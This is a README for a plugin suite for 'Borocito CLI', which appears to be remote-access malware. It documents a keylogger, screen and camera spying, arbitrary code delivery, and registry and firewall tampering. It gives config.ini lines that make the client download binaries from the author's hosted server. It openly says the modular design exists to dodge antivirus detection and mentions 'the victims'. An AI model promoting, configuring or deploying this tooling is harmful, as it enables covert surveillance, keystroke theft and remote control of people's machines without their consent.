
# borocito-components
Complementos/Plugins/Componentes para `Borocito CLI`  

## Complements
These plugins were created to enrich the experience with `BorocitoCLI`.  

They're not perfect, but they're not disappointing either. Well, it really depends on how they're made. I invite you to contribute to the development of these, if there is something, an error, bug, an idea, etc, contribute, I will greatly appreciate it, and those of us who use these complements too.  

### Using it
All plugins present here were originally created by [Zhenboro](https://github.com/Zhenboro). And for its use, it is vital and mandatory to use `boro-get`, it must be installed in order to use and manage the plugins mentioned here.  
`boro-get` is a module within `BorocitoCLI`. It's totally inside, well implemented. So, initially, there should be no problem.  

### About
BORO-GET tries to solve the following problem: Avoid over-loading the distributable executable. In addition, this gives freedom to create your own supplements and install them remotely. Total control. If you need a function, you can program it and implement it for yourself.  
Not only that, we also avoid the signature of the antivirus. Well, for example, `broKiloger` is very sus, it is a keys recorder. Thus the antivirus could only block that complement, but, not the instance of `BorocitoCLI`.  

### Repository
On the server, the Boro-Get folder is where everything `boro-get` will use.
You can leave the files that are within `boro-get` as they were when you downloaded them, this will make my repository be used located in my inventible "`chemic-jug`" server.   
Also, if you want my server to provide you with the repository, you must modify the file `Boro-Get/config.ini` that is in the `Borocito Server-Side` Boro-Get folder:   
```ini
[CONFIG]
Binaries=http://chemic-jug.000webhostapp.com/Borocito/Boro-Get/boro-get.zip
Repositories=http://chemic-jug.000webhostapp.com/Borocito/Boro-Get/Repositories.ini
```
**I really recommend you use my repository**, upload updates with improvements, etc. So you avoid having to update your repository.  
Do that change writting seting the `config.ini` file as shown:  
```ini
# Boro-Get Configuration File
[ASSEMBLY]
Name=boro-get
Version=1.2.0.0
Author=Zhenboro
Web=https://github.com/Zhenboro/borocito-components/tree/main/boro-get
[CONFIG]
Binaries=http://chemic-jug.000webhostapp.com/Borocito/Boro-Get/boro-get.zip
Repositories=http://chemic-jug.000webhostapp.com/Borocito/Boro-Get/Repositories.ini
```

**Remember: it's just a repository. I can not steal the victims and either receive files either. It's just read-only**  

---
# Documentation
This README will be deprecated for the next update. Now the documentation of the components will be in their respective README of their folders.

|Component|Information|Docs|
|--|--|--|
|boro-get|Packet manager|[View](https://github.com/Zhenboro/borocito-components/tree/dev/boro-get)|
|boro-hear|Response manager|[View](https://github.com/Zhenboro/borocito-components/tree/dev/boro-hear)|
|broArbitra|Arbitrary Code Supplier|[View](https://github.com/Zhenboro/borocito-components/tree/dev/broArbitra)|
|broEstoraje|FileSystem Operations|[View](https://github.com/Zhenboro/borocito-components/tree/dev/broEstoraje)|
|broFaierwoll|Firewall rule creator|[View](https://github.com/Zhenboro/borocito-components/tree/dev/broFaierwoll)|
|broKiloger|Keylogger|[View](https://github.com/Zhenboro/borocito-components/tree/dev/broKiloger)|
|broMaintainer|Maintainer for BorocitoCLI|[View](https://github.com/Zhenboro/borocito-components/tree/dev/broMaintainer)|
|broReedit|Windows Registry Editor|[View](https://github.com/Zhenboro/borocito-components/tree/dev/broReedit)|
|broRescue|Emergency Component for BorocitoCLI|[View](https://github.com/Zhenboro/borocito-components/tree/dev/broRescue)|
|broScrincam|Device Spy IO utilities|[View](https://github.com/Zhenboro/borocito-components/tree/dev/broScrincam)|

---
## WARNING
**The plugins created are not perfect. I recommend you take a look at the code to know what it does and how it does it, so you avoid unpredictable behavior or bad practices.**
